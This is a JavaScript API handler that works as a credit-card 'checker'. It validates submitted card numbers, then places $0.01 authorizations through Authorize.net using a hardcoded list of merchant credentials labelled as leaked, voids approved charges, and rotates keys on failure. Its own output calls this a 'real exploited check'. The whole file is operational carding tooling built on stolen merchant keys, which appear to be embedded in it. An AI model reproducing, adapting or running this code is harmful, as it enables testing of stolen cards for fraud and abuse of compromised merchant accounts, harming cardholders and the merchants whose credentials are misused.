import axios from 'axios';

const LEAKED_KEYS = [
  { login_id: '5KP3u95bQpv', transaction_key: '346HZ32z3fP4hTG2' },
  // ... (same as before, add all)
];

let keyIndex = 0;

function switchKey() {
  keyIndex = (keyIndex + 1) % LEAKED_KEYS.length;
}

function luhnChecksum(cardNumber) {
  const digits = cardNumber.split('').map(Number);
  let sum = 0;
  for (let i = 0; i < digits.length; i++) {
    let digit = digits[i];
    if ((digits.length - i) % 2 === 0) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
  }
  return sum % 10 === 0;
}

function validateExpDate(expMonth, expYear) {
  const now = new Date();
  const expDate = new Date(2000 + parseInt(expYear), parseInt(expMonth) - 1);
  return expDate > now;
}

function validateCvv(cvv, cardNumber) {
  const len = cvv.length;
  return (cardNumber.startsWith('34') || cardNumber.startsWith('37')) ? len === 4 : len === 3;
}

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  const { cardNumber, cvv, expMonth, expYear, fullCheck } = req.body;

  if (!luhnChecksum(cardNumber)) return res.json({ valid: false, reason: 'Invalid Luhn' });
  if (!validateExpDate(expMonth, expYear)) return res.json({ valid: false, reason: 'Expired' });
  if (!validateCvv(cvv, cardNumber)) return res.json({ valid: false, reason: 'Invalid CVV' });

  if (!fullCheck) return res.json({ valid: true, reason: 'Basic valid' });

  // Real API Call
  const key = LEAKED_KEYS[keyIndex];
  const url = 'https://api.authorize.net/xml/v1/request.api';
  const xmlData = `<?xml version="1.0" encoding="utf-8"?>
<createTransactionRequest xmlns="AnetApi/xml/v1/schema/AnetApiSchema.xsd">
  <merchantAuthentication>
    <name>${key.login_id}</name>
    <transactionKey>${key.transaction_key}</transactionKey>
  </merchantAuthentication>
  <transactionRequest>
    <transactionType>authCaptureTransaction</transactionType>
    <amount>0.01</amount>
    <payment>
      <creditCard>
        <cardNumber>${cardNumber}</cardNumber>
        <expirationDate>${expYear}-${expMonth.padStart(2, '0')}</expirationDate>
        <cardCode>${cvv}</cardCode>
      </creditCard>
    </payment>
  </transactionRequest>
</createTransactionRequest>`;

  try {
    const response = await axios.post(url, xmlData, {
      headers: { 'Content-Type': 'application/xml' },
      timeout: 10000,
    });
    if (response.data.includes('approved')) {
      // Void transaction
      const transIdMatch = response.data.match(/<transId>(.*?)<\/transId>/);
      if (transIdMatch) {
        const transId = transIdMatch[1];
        const voidXml = `<?xml version="1.0" encoding="utf-8"?>
<createTransactionRequest xmlns="AnetApi/xml/v1/schema/AnetApiSchema.xsd">
  <merchantAuthentication>
    <name>${key.login_id}</name>
    <transactionKey>${key.transaction_key}</transactionKey>
  </merchantAuthentication>
  <transactionRequest>
    <transactionType>voidTransaction</transactionType>
    <refTransId>${transId}</refTransId>
  </transactionRequest>
</createTransactionRequest>`;
        await axios.post(url, voidXml, { headers: { 'Content-Type': 'application/xml' } });
      }
      return res.json({ valid: true, reason: 'Valid and live (real exploited check)' });
    } else {
      switchKey(); // Rotate on fail
      return res.json({ valid: false, reason: 'Declined' });
    }
  } catch (error) {
    switchKey();
    return res.json({ valid: false, reason: `API Error: ${error.message}` });
  }
}
